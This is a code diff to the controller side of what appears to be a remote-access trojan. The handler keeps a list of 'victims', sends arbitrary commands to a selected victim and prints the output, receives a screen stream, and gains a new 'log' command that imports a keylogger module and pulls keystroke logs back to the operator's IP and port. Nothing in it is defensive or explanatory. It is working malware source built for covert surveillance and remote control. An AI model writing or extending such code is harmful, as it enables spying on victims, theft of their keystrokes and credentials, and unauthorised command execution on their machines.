@@ -2,6 +2,8 @@ from threading import Thread
 
 from stream.stream import Stream
 from server import Server
+from keylogger import get_send_log
+from cfg import cfg
 
 
 class Handler:
@@ -36,20 +38,35 @@ class Handler:
                     print('You\'re already exited')
 
             elif self.victim_index is not None:
-                if command == 'stream':
-                    srv.send_to_victim(self.victim_index, command)
+                try:
+                    if command == 'stream':
+                        srv.send_to_victim(self.victim_index, command)
 
-                    stream = Stream()
-                    thread = Thread(target=stream.receive)
-                    thread.start()
+                        stream = Stream()
+                        thread = Thread(target=stream.receive,
+                                        args=[cfg.local_ip, cfg.local_data_port])
+                        thread.start()
+                        continue
+
+                    elif command == 'log':
+                        srv.send_to_victim(self.victim_index, command)
+
+                        log = get_send_log.Log()
+                        thread = Thread(target=log.get_log,
+                                        args=[srv.victims[self.victim_index].info, cfg.local_ip, cfg.local_data_port])
+                        thread.start()
+                        continue
+
+
+                    else:
+                        srv.send_to_victim(self.victim_index, command)
+                        ans = srv.get_from_victim(self.victim_index)
+
+                        if ans.strip():
+                            print(ans)
+                except ConnectionError as e:
+                    print(e)
                     continue
-
-                else:
-                    srv.send_to_victim(self.victim_index, command)
-                    ans = srv.get_from_victim(self.victim_index)
-
-                    if ans.strip():
-                        print(ans)
 
             elif command == 'victims':
                 for i in range(len(srv.victims)):
